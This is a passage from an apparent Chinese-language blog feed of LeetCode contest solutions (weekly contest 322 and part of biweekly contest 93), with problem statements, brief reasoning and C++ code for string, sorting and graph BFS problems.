<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：sentence = &quot;leetcode exercises sound delightful&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：句子中的单词是 [&quot;leetcode&quot;, &quot;exercises&quot;, &quot;sound&quot;, &quot;delightful&quot;] 。</span><br><span class="line">- leetcode 的最后一个字符和 exercises 的第一个字符相等。</span><br><span class="line">- exercises 的最后一个字符和 sound 的第一个字符相等。</span><br><span class="line">- sound 的最后一个字符和 delightful 的第一个字符相等。</span><br><span class="line">- delightful 的最后一个字符和 leetcode 的第一个字符相等。</span><br><span class="line">这个句子是回环句。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：sentence = &quot;eetcode&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：句子中的单词是 [&quot;eetcode&quot;] 。</span><br><span class="line">- eetcode 的最后一个字符和 eetcode 的第一个字符相等。</span><br><span class="line">这个句子是回环句。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：sentence = &quot;Leetcode is cool&quot;</span><br><span class="line">输出：false</span><br><span class="line">解释：句子中的单词是 [&quot;Leetcode&quot;, &quot;is&quot;, &quot;cool&quot;] 。</span><br><span class="line">- Leetcode 的最后一个字符和 is 的第一个字符 不 相等。 </span><br><span class="line">这个句子 不 是回环句。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= sentence.length &lt;= 500</code></li>
<li><code>sentence</code> 仅由大小写英文字母和空格组成</li>
<li><code>sentence</code> 中的单词由单个空格进行分隔</li>
<li>不含任何前导或尾随空格</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-322/problems/circular-sentence/">https://leetcode.cn/contest/weekly-contest-322/problems/circular-sentence/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接将字符串切分为单词，然后依次检测相邻的单词是否符合回环的条件即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(1)$。</li>
<li>空间复杂度：$O(n)$。可以优化到 $O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isCircularSentence</span><span class="params">(string sentence)</span> </span>&#123;</span><br><span class="line">        vector&lt;string&gt; arr;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; sentence.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sentence[i] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                string s;</span><br><span class="line">                <span class="keyword">while</span>(i &lt; sentence.<span class="built_in">size</span>() &amp;&amp; sentence[i] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                    s.<span class="built_in">push_back</span>(sentence[i]);</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">                arr.<span class="built_in">emplace_back</span>(s);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> m = arr.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[i].<span class="built_in">back</span>() != arr[(i + <span class="number">1</span>) % m][<span class="number">0</span>]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6254-划分技能点相等的团队"><a href="#6254-划分技能点相等的团队" class="headerlink" title="6254. 划分技能点相等的团队"></a>6254. 划分技能点相等的团队</h3><p>给你一个正整数数组 <code>skill</code> ，数组长度为 <strong>偶数</strong> <code>n</code> ，其中 <code>skill[i]</code> 表示第 <code>i</code> 个玩家的技能点。将所有玩家分成 <code>n / 2</code> 个 <code>2</code> 人团队，使每一个团队的技能点之和 <strong>相等</strong> 。</p>
<p>团队的 <strong>化学反应</strong> 等于团队中玩家的技能点 <strong>乘积</strong> 。</p>
<p>返回所有团队的 <strong>化学反应</strong> 之和，如果无法使每个团队的技能点之和相等，则返回 <code>-1</code> 。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：skill = [3,2,5,1,3,4]</span><br><span class="line">输出：22</span><br><span class="line">解释：</span><br><span class="line">将玩家分成 3 个团队 (1, 5), (2, 4), (3, 3) ，每个团队的技能点之和都是 6 。</span><br><span class="line">所有团队的化学反应之和是 1 * 5 + 2 * 4 + 3 * 3 = 5 + 8 + 9 = 22 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：skill = [3,4]</span><br><span class="line">输出：12</span><br><span class="line">解释：</span><br><span class="line">两个玩家形成一个团队，技能点之和是 7 。</span><br><span class="line">团队的化学反应是 3 * 4 = 12 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：skill = [1,1,2,3]</span><br><span class="line">输出：-1</span><br><span class="line">解释：</span><br><span class="line">无法将玩家分成每个团队技能点都相等的若干个 2 人团队。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= skill.length &lt;= 105</code></li>
<li><code>skill.length</code> 是偶数</li>
<li><code>1 &lt;= skill[i] &lt;= 1000</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-322/problems/divide-players-into-teams-of-equal-skill/">https://leetcode.cn/contest/weekly-contest-322/problems/divide-players-into-teams-of-equal-skill/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>数学问题
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目要求数组中的元素可以分为 $\dfrac{n}{2}$ 个团队，且每个对中两个名成员的机能之和相等，则可以推出如下:</li>
</ol>
<ul>
<li>数组中的所有元素和 $sum$ 一定能被 $\dfrac{n}{2}$，且每两个成员中的和为 $x &#x3D; \dfrac{2 \times sum}{n}$;</li>
<li>我们直接将数组按照从小到大进行排序，可以知道 $skill[i] + skill[n-i-1] &#x3D; x$，我们依次判断即可。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$，其中 $n$ 为数组的元素。</li>
<li>空间复杂度：$O(\og n)$，其中 $n$ 为数组的元素。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">dividePlayers</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; skill)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> tot = <span class="built_in">accumulate</span>(skill.<span class="built_in">begin</span>(), skill.<span class="built_in">end</span>(), <span class="number">0LL</span>);</span><br><span class="line">        <span class="type">int</span> n = skill.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> m = n / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (tot % m != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> val = tot / m;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">sort</span>(skill.<span class="built_in">begin</span>(), skill.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (skill[i] + skill[n - i - <span class="number">1</span>] != val) &#123;</span><br><span class="line">                 <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res += skill[i] * skill[n - i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="6255-两个城市间路径的最小分数"><a href="#6255-两个城市间路径的最小分数" class="headerlink" title="6255. 两个城市间路径的最小分数"></a>6255. 两个城市间路径的最小分数</h3><p>给你一个正整数 <code>n</code> ，表示总共有 <code>n</code> 个城市，城市从 <code>1</code> 到 <code>n</code> 编号。给你一个二维数组 <code>roads</code> ，其中 <code>roads[i] = [ai, bi, distancei]</code> 表示城市 <code>ai</code> 和 <code>bi</code> 之间有一条 <strong>双向</strong> 道路，道路距离为 <code>distancei</code> 。城市构成的图不一定是连通的。</p>
<p>两个城市之间一条路径的 <strong>分数</strong> 定义为这条路径中道路的 <strong>最小</strong> 距离。</p>
<p>城市 <code>1</code> 和城市 <code>n</code> 之间的所有路径的 <strong>最小</strong> 分数。</p>
<p><strong>注意：</strong></p>
<ul>
<li>一条路径指的是两个城市之间的道路序列。</li>
<li>一条路径可以 <strong>多次</strong> 包含同一条道路，你也可以沿着路径多次到达城市 <code>1</code> 和城市 <code>n</code> 。</li>
<li>测试数据保证城市 <code>1</code> 和城市<code>n</code> 之间 <strong>至少</strong> 有一条路径。</li>
</ul>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/10/12/graph11.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 4, roads = [[1,2,9],[2,3,6],[2,4,5],[1,4,7]]</span><br><span class="line">输出：5</span><br><span class="line">解释：城市 1 到城市 4 的路径中，分数最小的一条为：1 -&gt; 2 -&gt; 4 。这条路径的分数是 min(9,5) = 5 。</span><br><span class="line">不存在分数更小的路径。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/10/12/graph22.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 4, roads = [[1,2,2],[1,3,4],[3,4,7]]</span><br><span class="line">输出：2</span><br><span class="line">解释：城市 1 到城市 4 分数最小的路径是：1 -&gt; 2 -&gt; 1 -&gt; 3 -&gt; 4 。这条路径的分数是 min(2,2,4,7) = 2 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= n &lt;= 105</code></li>
<li><code>1 &lt;= roads.length &lt;= 105</code></li>
<li><code>roads[i].length == 3</code></li>
<li><code>1 &lt;= ai, bi &lt;= n</code></li>
<li><code>ai != bi</code></li>
<li><code>1 &lt;= distancei &lt;= 104</code></li>
<li>不会有重复的边。</li>
<li>城市 <code>1</code> 和城市 <code>n</code> 之间至少有一条路径。</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-322/problems/minimum-score-of-a-path-between-two-cities/">https://leetcode.cn/contest/weekly-contest-322/problems/minimum-score-of-a-path-between-two-cities/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>广度优先搜索
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目出的很奇怪，由于题目求的所有路径中小的两点距离，且两点间的路径可以来回重复，这就变的非常简单的题目，我们直接找到包含节点 $1$ 与节点 $n-1$ 的所有在的有向图构成的连通单元，并找到该连通单元中最小的边的值即可。</li>
</ol>
<ul>
<li>我们可以用 $BFS$ 遍历所有的边即可。标记每个顶点，由于任意两个顶点中有且只有一条边连接，所有我们遍历所有的顶点即可遍历所有的边。</li>
</ul>
<ol start="2">
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(V + E)$，$V$ 表示顶点个数，$E$ 表示边的个数。</li>
<li>空间复杂度：空间复杂度为 $O(V + E)$，$V$ 表示顶点个数，$E$ 表示边的个数。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minScore</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; roads)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;&gt; <span class="built_in">graph</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : roads) &#123;</span><br><span class="line">            <span class="type">int</span> x = v[<span class="number">0</span>] - <span class="number">1</span>, y = v[<span class="number">1</span>] - <span class="number">1</span>, cost = v[<span class="number">2</span>];</span><br><span class="line">            graph[x].<span class="built_in">emplace_back</span>(y, cost);</span><br><span class="line">            graph[y].<span class="built_in">emplace_back</span>(x, cost);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> res = INT_MAX;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visit</span><span class="params">(n, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        queue&lt;<span class="type">int</span>&gt; qu;</span><br><span class="line">        qu.<span class="built_in">emplace</span>(<span class="number">0</span>);</span><br><span class="line">        visit[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span>(!qu.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">auto</span> cur = qu.<span class="built_in">front</span>();</span><br><span class="line">            qu.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> [next, cost] : graph[cur]) &#123;</span><br><span class="line">                res = <span class="built_in">min</span>(res, cost);</span><br><span class="line">                <span class="keyword">if</span> (visit[next]) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                qu.<span class="built_in">emplace</span>(next);</span><br><span class="line">                visit[next] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6256-将节点分成尽可能多的组"><a href="#6256-将节点分成尽可能多的组" class="headerlink" title="6256. 将节点分成尽可能多的组"></a>6256. 将节点分成尽可能多的组</h3><p>给你一个正整数 <code>n</code> ，表示一个 <strong>无向</strong> 图中的节点数目，节点编号从 <code>1</code> 到 <code>n</code> 。</p>
<p>同时给你一个二维整数数组 <code>edges</code> ，其中 <code>edges[i] = [ai, bi]</code> 表示节点 <code>ai</code> 和 <code>bi</code> 之间有一条 <strong>双向</strong> 边。注意给定的图可能是不连通的。</p>
<p>请你将图划分为 <code>m</code> 个组（编号从 <strong>1</strong> 开始），满足以下要求：</p>
<ul>
<li>图中每个节点都只属于一个组。</li>
<li>图中每条边连接的两个点 <code>[ai, bi]</code> ，如果 <code>ai</code> 属于编号为 <code>x</code> 的组，<code>bi</code> 属于编号为 <code>y</code> 的组，那么 <code>|y - x| = 1</code> 。</li>
</ul>
<p>请你返回最多可以将节点分为多少个组（也就是最大的 <code>m</code> ）。如果没办法在给定条件下分组，请你返回 <code>-1</code> 。</p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/10/13/example1.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 6, edges = [[1,2],[1,4],[1,5],[2,6],[2,3],[4,6]]</span><br><span class="line">输出：4</span><br><span class="line">解释：如上图所示，</span><br><span class="line">- 节点 5 在第一个组。</span><br><span class="line">- 节点 1 在第二个组。</span><br><span class="line">- 节点 2 和节点 4 在第三个组。</span><br><span class="line">- 节点 3 和节点 6 在第四个组。</span><br><span class="line">所有边都满足题目要求。</span><br><span class="line">如果我们创建第五个组，将第三个组或者第四个组中任何一个节点放到第五个组，至少有一条边连接的两个节点所属的组编号不符合题目要求。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 3, edges = [[1,2],[2,3],[3,1]]</span><br><span class="line">输出：-1</span><br><span class="line">解释：如果我们将节点 1 放入第一个组，节点 2 放入第二个组，节点 3 放入第三个组，前两条边满足题目要求，但第三条边不满足题目要求。</span><br><span class="line">没有任何符合题目要求的分组方式。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 500</code></li>
<li><code>1 &lt;= edges.length &lt;= 104</code></li>
<li><code>edges[i].length == 2</code></li>
<li><code>1 &lt;= ai, bi &lt;= n</code></li>
<li><code>ai != bi</code></li>
<li>两个点之间至多只有一条边。</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-322/problems/divide-nodes-into-the-maximum-number-of-groups/">https://leetcode.cn/contest/weekly-contest-322/problems/divide-nodes-into-the-maximum-number-of-groups/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 动态规划</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>首先根据题目的思路大概就可以知道本体的时间复杂度范围大概在 $V\times (V + E)$ 内可以接受，因为本题中 $0 \le V \le 500$。</li>
<li>对于每个连通图单元的分组我们观察一下一定有以下特这：</li>
</ol>
<ul>
<li>一定包含只有一个节点的分组，否则一定存在属于某条边的两个节点被分到一个分组中，这样就部分题目要求满足 $|x-y| &#x3D; 1$。</li>
<li>我们一旦确定某个分组，则根据依赖关系可知，其他分组也可以确定，此时我们即可计算出分组的个数；</li>
<li>我们依次枚举只含有一个节点的分组，即可得到该连通单元的最大分组；</li>
<li>不同连通单元之间的最大分组互不影响；<br>根据上述的分析可以知道，解题步骤如下：</li>
<li>首先求出图中各个连通单元 $component$，此时我们可以用 $BFS$ 求出即可；</li>
<li>其次我们可以依次对每个 $component$ 求出最大分组：<ul>
<li>我们依次枚举 $component$ 中的顶点 $V_{i}$ 作为分组的起点，然后依次求出其他所有可能的分组，我们对分组进行编号 $order[v_{i}]$，我们知道同属于一条边的两个节点 $x,y$，则此时一定满足 $|order[x] -order[y]| &#x3D; 1$；</li>
<li>依据上述条件作为检测依据，检查该 $component$ 可被完成划分，最得到最大的分组 $cnt$；</li>
</ul>
</li>
<li>所有节点的最大划分即为 $cnt_{j}$ 之和。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(V \times (V + E))$，其中 $V$ 表示顶点的个数，$E$ 表示边的数组。</li>
<li>空间复杂度：$O(V + E)$，其中 $V$ 表示顶点的个数，$E$ 表示边的数组。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">magnificentSets</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">adj</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : edges) &#123;</span><br><span class="line">            <span class="type">int</span> x = v[<span class="number">0</span>] - <span class="number">1</span>, y = v[<span class="number">1</span>] - <span class="number">1</span>;</span><br><span class="line">            adj[x].<span class="built_in">emplace_back</span>(y);</span><br><span class="line">            adj[y].<span class="built_in">emplace_back</span>(x);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visit</span><span class="params">(n, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!visit[i]) &#123;</span><br><span class="line">                vector&lt;<span class="type">int</span>&gt; component;</span><br><span class="line">                queue&lt;<span class="type">int</span>&gt; qu;</span><br><span class="line">                qu.<span class="built_in">emplace</span>(i);</span><br><span class="line">                visit[i] = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">while</span>(!qu.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                    <span class="type">int</span> curr = qu.<span class="built_in">front</span>();</span><br><span class="line">                    qu.<span class="built_in">pop</span>();</span><br><span class="line">                    component.<span class="built_in">emplace_back</span>(curr);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">auto</span> next : adj[curr]) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(visit[next]) <span class="keyword">continue</span>;</span><br><span class="line">                        visit[next] = <span class="literal">true</span>;</span><br><span class="line">                        qu.<span class="built_in">emplace</span>(next);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="type">int</span> cnt = <span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">auto</span> v : component) &#123;</span><br><span class="line">                    queue&lt;<span class="type">int</span>&gt; qu;</span><br><span class="line">                    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">order</span><span class="params">(n, <span class="number">-1</span>)</span></span>;</span><br><span class="line">                    qu.<span class="built_in">emplace</span>(v);</span><br><span class="line">                    order[v] = <span class="number">0</span>;</span><br><span class="line">                    <span class="type">int</span> step = <span class="number">0</span>;</span><br><span class="line">                    <span class="type">bool</span> valid = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">while</span>(!qu.<span class="built_in">empty</span>() &amp;&amp; valid) &#123;</span><br><span class="line">                        <span class="type">int</span> sz = qu.<span class="built_in">size</span>();</span><br><span class="line">                        step++;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; sz; j++) &#123;</span><br><span class="line">                            <span class="type">int</span> curr = qu.<span class="built_in">front</span>();</span><br><span class="line">                            qu.<span class="built_in">pop</span>();</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">auto</span> next : adj[curr]) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (order[next] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="built_in">abs</span>(order[curr] - order[next]) != <span class="number">1</span>) &#123;</span><br><span class="line">                                        valid = <span class="literal">false</span>;</span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">continue</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                order[next] = step;</span><br><span class="line">                                qu.<span class="built_in">emplace</span>(next);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (valid) &#123;</span><br><span class="line">                        cnt = <span class="built_in">max</span>(cnt, step);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (cnt &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ans += cnt;</span><br><span class="line">            &#125;            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode biweekly contest 93</title>
    <url>/2022/12/11/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/87/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-contest-93"><a href="#leetcode-biweekly-contest-93" class="headerlink" title="leetcode  biweekly contest 93"></a>leetcode  biweekly contest 93</h2><p>双周赛的前三题都是简单题目，最后一题比较难，思考了很长时间还是没有太好的思路。</p>
<h3 id="6261-数组中字符串的最大值"><a href="#6261-数组中字符串的最大值" class="headerlink" title="6261. 数组中字符串的最大值"></a>6261. 数组中字符串的最大值</h3><p>一个由字母和数字组成的字符串的 <strong>值</strong> 定义如下：</p>
<ul>
<li>如果字符串 <strong>只</strong> 包含数字，那么值为该字符串在 <code>10</code> 进制下的所表示的数字。</li>
<li>否则，值为字符串的 <strong>长度</strong> 。</li>
</ul>
<p>给你一个字符串数组 <code>strs</code> ，每个字符串都只由字母和数字组成，请你返回 <code>strs</code> 中字符串的 <strong>最大值</strong> 。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：strs = [&quot;alic3&quot;,&quot;bob&quot;,&quot;3&quot;,&quot;4&quot;,&quot;00000&quot;]</span><br><span class="line">输出：5</span><br><span class="line">解释：</span><br><span class="line">- &quot;alic3&quot; 包含字母和数字，所以值为长度 5 。</span><br><span class="line">- &quot;bob&quot; 只包含字母，所以值为长度 3 。</span><br><span class="line">- &quot;3&quot; 只包含数字，所以值为 3 。</span><br><span class="line">- &quot;4&quot; 只包含数字，所以值为 4 。</span><br><span class="line">- &quot;00000&quot; 只包含数字，所以值为 0 。</span><br><span class="line">所以最大的值为 5 ，是字符串 &quot;alic3&quot; 的值。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：strs = [&quot;1&quot;,&quot;01&quot;,&quot;001&quot;,&quot;0001&quot;]</span><br><span class="line">输出：1</span><br><span class="line">解释：</span><br><span class="line">数组中所有字符串的值都是 1 ，所以我们返回 1 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= strs.length &lt;= 100</code></li>
<li><code>1 &lt;= strs[i].length &lt;= 9</code></li>
<li><code>strs[i]</code> 只包含小写英文字母和数字。</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-93/problems/maximum-value-of-a-string-in-an-array/">https://leetcode.cn/contest/biweekly-contest-93/problems/maximum-value-of-a-string-in-an-array/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>将每个字符串进行转换，如果只含有数字则进行转换，否则则不进行转换。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(mn)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximumValue</span><span class="params">(vector&lt;string&gt;&amp; strs)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = strs.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">bool</span> isNum = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> c : strs[i]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(c)) &#123;</span><br><span class="line">                    isNum = <span class="literal">false</span>;</span><br><span class="line">                    <span 